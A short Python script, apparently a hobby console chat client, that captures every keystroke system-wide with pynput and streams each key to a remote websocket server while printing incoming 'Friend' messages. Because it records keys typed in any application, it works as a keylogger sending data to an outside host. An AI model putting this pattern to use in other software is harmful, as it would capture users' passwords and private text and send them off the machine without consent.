# ← Console client: sends raw keys per-character
import asyncio
import websockets
from pynput import keyboard
import sys

typed_keys = ""
ws = None
loop = None


async def send_key(message):
    global ws

    if ws is not None:
        try:
            await ws.send(message)
            print(f"\nSent: {message}")

        except:
            print("\nFailed to send")


def on_press(key):
    global typed_keys

    try:
        typed_keys += key.char
        current_key = key.char

    except AttributeError:
        current_key = f"[{key}]"
        typed_keys += current_key

    print(f"\nSaved: {typed_keys}")

    # latest key send
    asyncio.run_coroutine_threadsafe(
        send_key(current_key),
        loop
    )

    # ESC press korle program exit
    if key == keyboard.Key.esc:
        print("\nESC pressed. Exiting...")

        asyncio.run_coroutine_threadsafe(
            close_connection(),
            loop
        )

        return False


async def close_connection():
    global ws

    try:
        if ws is not None:
            await ws.close()

    except:
        pass

    sys.exit()


async def receive_messages(websocket):
    while True:
        try:
            message = await websocket.recv()
            print(f"\nFriend: {message}")

        except:
            print("\nDisconnected from server")
            break


async def chat():
    global ws

    uri = "wss://wan-data-t.onrender.com/ws"

    async with websockets.connect(uri) as websocket:

        ws = websocket

        print("Connected to server")
        print("Press ESC to exit\n")

        # keyboard listener start
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        await receive_messages(websocket)


if __name__ == "__main__":

    loop = asyncio.get_event_loop()

    try:
        loop.run_until_complete(chat())

    except KeyboardInterrupt:
        print("\nProgram stopped")

    finally:
        loop.close()